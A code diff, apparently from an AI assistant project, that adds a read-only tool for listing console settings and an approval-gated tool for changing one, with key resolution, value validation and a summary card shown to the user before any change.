+        from ..api.common import settings_payload
+
+        return settings_payload(jarvis)["settings"]
+
+    def _compact(row: dict[str, Any]) -> dict[str, Any]:
+        return {
+            "key": row["key"],
+            "label": row["label"],
+            "type": row["type"],
+            "value": row.get("value"),
+        }
+
+    def _detailed(row: dict[str, Any]) -> dict[str, Any]:
+        out = {
+            **_compact(row),
+            "group": row.get("group"),
+            "does": row.get("note") or row["label"],
+            "takes_effect": row.get("apply"),
+        }
+        choices = row.get("choices")
+        if isinstance(choices, list) and choices:
+            out["choices"] = list(choices[:max_choices_shown])
+            if len(choices) > max_choices_shown:
+                out["more_choices"] = len(choices) - max_choices_shown
+        return out
+
+    def _row_matches(row: dict[str, Any], words: list[str]) -> bool:
+        haystack = " ".join(
+            str(row.get(field) or "") for field in ("key", "label", "group", "note")
+        ).lower().replace("_", " ").replace(".", " ")
+        return all(word in haystack for word in words)
+
+    async def _list_settings(args: dict[str, Any], context: Any) -> Any:
+        from ..settings import nearest_settings
+
+        query = str(args.get("query") or "").strip()
+        rows = _settings_rows()
+        if not query:
+            # Compact: every key, label, type and value, and nothing else.
+            # The whole registry has to fit a tool result with room for the
+            # model's answer, and the notes and choice lists are what make it
+            # not fit — a model that wants one setting's meaning asks for it.
+            return {
+                "status": "ok",
+                "count": len(rows),
+                "settings": [_compact(row) for row in rows],
+                "note": (
+                    "Only these settings exist. Call again with `query` for one "
+                    "setting's meaning and allowed values."
+                ),
+            }
+        words = query.lower().replace("_", " ").replace(".", " ").split()
+        matched = [row for row in rows if _row_matches(row, words)]
+        if not matched:
+            nearest = nearest_settings(query)
+            return {
+                "status": "ok",
+                "count": 0,
+                "settings": [],
+                "nearest": nearest,
+                "note": (
+                    f"No setting matches {query!r}; the nearest are "
+                    f"{', '.join(nearest)}. Say so, and offer the real name."
+                ),
+            }
+        return {
+            "status": "ok",
+            "count": len(matched),
+            "settings": [_detailed(row) for row in matched],
+        }
+
+    registry.register(
+        name="list_settings",
+        description=(
+            "The settings a person can change on the console, with each one's "
+            "key, label, type, current value and — with a `query` — what it "
+            "does and the values it accepts. Call this before saying a "
+            "setting does or does not exist; only the keys it returns exist."
+        ),
+        parameters=schema_object(
+            {
+                "query": {
+                    "type": "string",
+                    "description": (
+                        "A word to filter by, matched against the key, the "
+                        "label and the description: 'voice', 'model', "
+                        "'temperature'. Omit for the whole list, compact."
+                    ),
+                },
+            }
+        ),
+        handler=_list_settings,
+        tier=TIER_DIRECT,
+        read_only=True,
+    )
+
+    def _resolve_setting_key(asked: Any) -> tuple[Any, str]:
+        """The spec for what the model called the setting, or why not.
+
+        The sentence is the model's next move: an unknown name gets the
+        nearest real keys, an ambiguous one ("model") gets the settings it
+        could mean, and both end with the instruction that fixes it.
+        """
+        from ..settings import matching_settings, nearest_settings
+
+        name = str(asked or "").strip()
+        matches = matching_settings(name)
+        if len(matches) == 1:
+            return matches[0], ""
+        if matches:
+            names = ", ".join(spec.key for spec in matches)
+            return None, (
+                f"{name!r} could be any of {names}. Say which, by its exact key."
+            )
+        nearest = nearest_settings(name)
+        return None, (
+            f"no setting called {name!r}; the nearest are {', '.join(nearest)}. "
+            "Call list_settings to see them, and use the exact key."
+        )
+
+    def _pin_setting(args: dict[str, Any]) -> dict[str, Any]:
+        """Freeze the key, the coerced value and the value it replaces.
+
+        Refuses — `ToolError`, which `call()` returns as the tool's error
+        instead of holding a card — when the key names no setting or the
+        value is one its validator would refuse: a human asked to approve
+        "Change Temperature from 0.7 to 9" is being asked to approve a
+        failure, and the model would learn the refusal only after a denial.
+        """
+        from ..api.common import current_setting_value
+        from ..settings import SettingsError
+
+        spec, complaint = _resolve_setting_key(args.get("key"))
+        if spec is None:
+            raise ToolError(complaint)
+        raw = args.get("value")
+        try:
+            value = spec.validate(raw) if spec.validate else raw
+        except SettingsError as err:
+            raise ToolError(f"{spec.label} ({spec.key}) cannot be {raw!r}: {err}") from err
+        return {
+            "key": spec.key,
+            "value": value,
+            # Read now, so the card says "from" what it really is at the
+            # moment of asking; the handler reads it again when it runs.
+            "previous": current_setting_value(jarvis, spec.key),
+            "label": spec.label,
+        }
+
+    def _shown(value: Any) -> str:
+        """A value as a person reads it: `on`/`off` for a boolean, bare text otherwise."""
+        if isinstance(value, bool):
+            return "on" if value else "off"
+        if value is None or value == "":
+            return "empty"
+        return str(value)
+
+    def _summarise_setting(pinned: dict[str, Any]) -> str:
+        return (
+            f"Change {pinned.get('label') or pinned.get('key')} "
+            f"({pinned.get('key')}) from {_shown(pinned.get('previous'))} "
+            f"to {_shown(pinned.get('value'))}"
+        )
+
+    async def _change_setting(args: dict[str, Any], context: Any) -> Any:
+        from ..api.common import ApiError, async_set_setting
+
+        # The pin has already resolved the key for a held call; resolving
+        # again here is for a caller that reached the handler another way,
+        # and it is the same resolver, so the two cannot disagree.
+        spec, complaint = _resolve_setting_key(args.get("key"))
+        if spec is None:
+            return {"status": "error", "error": complaint}
+        if "value" not in args:
+            return {"status": "error", "error": "change_setting needs a value"}
+        try:
+            # THE write path — the console's `config/settings/set` is this
+            # same function: allowlist, validator, re-merge, live apply, the
+            # audit line and `jarvis_setting_changed`, in that order.
+            result = await async_set_setting(
+                jarvis, {"key": spec.key, "value": args["value"]}, context=context
+            )
+        except ApiError as exc:
+            return {"status": "error", "error": exc.message, "key": spec.key}
+        previous, value = result["previous"], result["value"]
+        sentence = (
+            f"Changed {spec.label} ({spec.key}) from {_shown(previous)} to {_shown(value)}."
+        )
+        if result["restart_required"]:
+            sentence += " It takes effect after a restart."
+        return {
+            "status": "ok",
+            "key": spec.key,
+            "label": spec.label,
+            "previous": previous,
+            "value": value,
+            "applied": result["applied"],
+            "restart_required": result["restart_required"],
+            "summary": sentence,
+        }
+
+    registry.register(
+        name="change_setting",
+        description=(
+            "Change one console setting. Needs the user's approval: the key, "
+            "the new value and the value it replaces are shown to them first. "
+            "Use the exact key from list_settings; a key that is not a setting "
+            "is refused with the nearest real ones."
+        ),
+        parameters=schema_object(
+            {
+                "key": {
+                    "type": "string",
+                    "description": "The setting's key, as list_settings gives it: 'llm.model'.",
+                },
+                "value": {
+                    # No `type`: a number, a boolean or a string depending on the
+                    # setting, and the setting's own validator decides.
+                    "description": "The new value.",
+                },
+            },
+            required=["key", "value"],
+        ),
+        handler=_change_setting,
+        tier=TIER_APPROVAL,
+        pin=_pin_setting,
+        summarise=_summarise_setting,
     )
 
 
